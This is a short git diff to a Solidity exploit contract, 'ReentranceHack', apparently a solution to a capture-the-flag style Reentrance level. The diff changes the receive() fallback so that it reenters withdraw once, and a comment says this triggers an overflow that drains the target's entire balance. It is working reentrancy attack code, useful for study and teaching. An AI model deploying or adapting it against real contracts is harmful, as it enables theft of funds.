@@ -5,6 +5,7 @@ import 'levels/Reentrance.sol';
 contract ReentranceHack {
   Reentrance target;
   uint256 public amount;
+  bool reentered;
 
   constructor(address payable targetAddress) {
     target = Reentrance(targetAddress);
@@ -20,8 +21,10 @@ contract ReentranceHack {
   }
 
   receive() external payable {
-    if (address(target).balance != 0) {
-      target.withdraw(amount);
+    /// @dev: reenter only once, it is enough to cause overflow and withdraw at last all the remaining balance
+    if (!reentered) {
+      reentered = true;
+      target.withdraw(address(target).balance);
     }
   }
 }
